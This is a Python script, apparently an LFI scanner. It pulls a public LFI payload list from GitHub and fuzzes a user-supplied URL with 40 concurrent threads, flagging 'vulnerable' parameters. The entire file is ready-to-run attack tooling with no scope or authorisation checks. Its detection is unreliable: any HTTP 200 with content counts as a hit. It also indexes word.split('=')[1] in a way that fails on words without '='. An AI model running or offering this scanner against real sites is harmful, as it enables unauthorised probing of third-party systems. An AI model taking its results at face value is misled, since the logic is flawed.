import requests
import argparse
import concurrent.futures

def test_vulnerability(url):
    response = requests.get(url, allow_redirects=False)
    status_code = response.status_code
    content_length = response.headers.get('Content-Length')
    return status_code == 200 and content_length and int(content_length) > 0

def download_payloads(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.split("\n")
    except requests.exceptions.RequestException as e:
        print(f"Error downloading payloads: {e}")
        return []

def check_vulnerability(word, payloads, base_url):
    vulnerable = False
    for payload in payloads:
        fuzzed_url = base_url.replace("FUZZ", f"{word}={payload}")
        if test_vulnerability(fuzzed_url):
            print(f"Vulnerable to LFI: Word: {word.split('=')[1]}, Payload: {payload}, Fuzzed URL: {fuzzed_url}")
            vulnerable = True
            break
    return vulnerable

def main():
    parser = argparse.ArgumentParser(description="LFI Vulnerability Scanner")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist for fuzzing position")
    parser.add_argument("-u", "--url", required=True, help="Base URL of the vulnerable application")
    args = parser.parse_args()

    payloads_url = "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
    payloads = download_payloads(payloads_url)

    if not payloads:
        print("No payloads downloaded. Exiting.")
        return

    with open(args.wordlist, "r") as wordlist_file:
        custom_dictionary = [line.strip() for line in wordlist_file]

    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executor:
        future_to_word = {executor.submit(check_vulnerability, word, payloads, args.url): word for word in custom_dictionary}

        for future in concurrent.futures.as_completed(future_to_word):
            word = future_to_word[future]
            try:
                if future.result():
                    print(f"Potential vulnerability found for Word: {word.split('=')[1]}")
            except Exception as e:
                print(f"Error processing word {word}: {e}")

if __name__ == "__main__":
    main()
